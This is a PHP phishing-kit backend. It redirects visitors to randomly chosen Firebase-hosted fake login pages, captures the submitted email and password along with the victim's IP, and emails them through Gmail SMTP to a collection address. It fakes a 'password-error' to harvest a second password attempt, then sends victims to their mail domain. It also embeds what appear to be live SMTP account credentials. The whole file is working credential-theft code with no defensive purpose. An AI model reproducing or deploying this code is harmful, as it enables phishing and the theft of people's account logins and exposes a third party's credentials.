<?php

$smtpuser = 'mehrdad.anvrai@gmail.com'; // enter the email address of the smtp you want to use
$userpass = '1feanyi12345'; // enter the password of the smtp you want to use
$dropbox = 'alxy697@gmail.com'; // enter email address your your logins should report
$smtpservice = 'smtp.gmail.com';  // change to 'smtp.yandex.com' if your smtp is yandex mail
// NOTE: Gmail smtp may likely push your login to spam box
// https://firebasestorage.googleapis.com/v0/b/admin-server-48271.appspot.com/o/rc%2Fredirect.html?alt=media&token=ac68d656-5790-404a-9d8a-397010110f44
// replace 'index.html' with link(s) of firebase page(s) for autolink
$linked = array (
  "https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%202.html?alt=media&token=58febd44-b519-4949-b65a-b32099e75a9e", 
 "https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%203.html?alt=media&token=60e0477d-34c3-45b7-9658-6711125bce46", 
 "https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%204.html?alt=media&token=226c9658-2108-42c3-8f29-1ab760b6f0a6", 
 "https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%205.html?alt=media&token=3bb532b9-c137-4ef4-9a78-0beac75e9edb", 
 "https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%206.html?alt=media&token=eeb1d47f-e4e9-4de5-af5a-bf378e0d59e2", 
 "https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%207.html?alt=media&token=8a73b628-6e7a-4979-b9a5-cbf95f5a5fd3",
 "https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%208.html?alt=media&token=8bf43e0a-a5c3-4ae7-8607-abbb074f1905", 
 "https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%209.html?alt=media&token=2f3207fc-eddc-4480-906f-ae2ba1214370", 
 "https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy.html?alt=media&token=ef92abd6-01e1-4a8e-b262-a72dcecdcb36", 
 "https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex.html?alt=media&token=3047339a-e683-4ea8-a980-ffbd71977d9e" 
);

$i = p();
$username = $email = $pet = $pett = $error = $source = $subj = '';
$reff = $_SERVER['HTTP_REFERER'];
if ($_SERVER['REQUEST_METHOD'] === 'GET'){
    $loc = getLink($linked);
    if(isset($_GET['email']) && !empty($_GET['email'])){
        $email = $_GET['email'];
        if (strpos($loc, '?')){
            $loc .= "&email=".$email;
        } else {
            $loc .= "?email=".$email;
        }
    }
    header("Location: $loc");
    exit;
}

$from = 'INITIAL';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['source'])){
    if (isset($_POST['pet']) && isset($_POST['pett'])){
        $pet = $_POST['pet'];
        $pett = $_POST['pett'];
    }
    if (isset($_POST['error'])){
        $error = $_POST['error'];
    }
    if (empty($pet) || empty($pett)){
        header("Location: $reff");
        exit;
    }
}
if (isset($_POST['error']) && !empty($_POST['error'])){
    $from = 'FINAL';
}
if (isset($_POST['source'])){
    $source = $_POST['source'];
    $subj = "$source | .$i";
}
$bod = "
<HTML>
<BODY>
    <div> PAGE: $from </div>
    <div> USER: $pet </div>
    <div> ENTER: $pett </div>
    <div> HOME: <a href='http://whoer.net/check?host=$i' target='_blank'>$i</a> </div>
</BODY>
</HTML>
";
require 'PHPMailerAutoload.php';
$mail = new PHPMailer;
$mail->SMTPDebug = 3;
$mail->isSMTP();
// $mail->Host = 'smtp.yandex.com';
$mail->Host = $smtpservice;
$mail->Port = 465; // for any of gmail or yandex
// $mail->Port = 587;
// $mail->Port = 25;
$mail->SMTPAuth = true;
$mail->SMTPSecure = 'ssl';
$mail->SMTPOptions = array (
    'ssl' => array(
    'verify_peer' => false,
    'verify_peer_name' => false,
    'allow_self_signed' => true)
); 
$mail->Username = $smtpuser;
$mail->Password = $userpass;
$mail->From = $smtpuser;
$mail->FromName = $source;
$mail->addAddress($dropbox);
$mail->isHTML(true);
$mail->Subject = $subj;
$mail->Body    = $bod;
if(!$mail->send()) {
    echo 'Message could not be sent.';
    echo 'Mailer Error: ' . $mail->ErrorInfo;
    $bod = "PAGE: $from \n USER: $pet \n ENTER: $pett \n HOME: http://whoer.net/check?host=$i";
    mail($dropbox, $subj, $bod);
    // exit; //uncomment this line to see error if mail did not send
}

if (isset($_POST['error']) && !empty($_POST['error'])){
    $dom = substr(strrchr($pet, "@"), 1);
    header("Location: http://$dom");
    exit;
} else {
    if (strpos($reff, '?')){
        $reff .= "&error=password-error";
    } else {
        $reff .= "?error=password-error";
    }
    header("Location: $reff");
    exit;
}
 function getlink($arr){
    $num = rand(0, count($arr) - 1);
    return $arr[$num];
 }
 function p(){
    switch(true){
      case (!empty($_SERVER['HTTP_X_REAL_IP'])) : return $_SERVER['HTTP_X_REAL_IP'];
      case (!empty($_SERVER['HTTP_CLIENT_IP'])) : return $_SERVER['HTTP_CLIENT_IP'];
      case (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) : return $_SERVER['HTTP_X_FORWARDED_FOR'];
      default : return $_SERVER['REMOTE_ADDR'];
    }
}
?>